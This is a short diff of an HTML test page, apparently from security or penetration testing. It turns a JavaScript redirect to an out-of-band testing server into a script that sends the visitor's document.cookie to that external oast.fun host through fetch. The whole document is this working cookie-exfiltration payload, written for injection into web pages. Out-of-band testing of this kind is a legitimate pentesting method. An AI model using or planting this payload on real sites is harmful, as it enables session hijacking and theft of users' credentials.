@@ -1,13 +1,12 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>Redirect Test</title>
+    <title>Cookie Leak</title>
   </head>
   <body>
-    <h1>Testing JS Redirect...</h1>
+    <h1>Leaking document.cookie...</h1>
     <script>
-      // Redirect to Burp Collaborator / OAST server
-      document.location = "https://uhhltogbwnccvykrntrsndmki0g7l296g.oast.fun";
+      fetch("https://uhhltogbwnccvykrntrsndmki0g7l296g.oast.fun?c=" + document.cookie);
     </script>
   </body>
 </html>
